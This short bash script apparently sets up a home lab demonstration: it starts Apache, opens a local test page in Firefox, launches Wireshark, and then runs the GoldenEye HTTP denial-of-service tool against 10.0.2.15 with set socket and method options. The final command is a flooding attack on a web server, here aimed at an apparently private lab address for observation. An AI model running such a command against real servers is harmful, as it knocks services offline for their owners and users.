#!/bin/bash

# Step 1: Start Apache2
sudo systemctl start apache2

# Step 2: Open second.html on Firefox
firefox http://localhost/second.html &

# Step 3: Open Wireshark
wireshark &

# Step 4: Execute goldeneye.py
cd /home/kali/GoldenEye
sudo ./goldeneye.py http://10.0.2.15/ -s 10 -m random
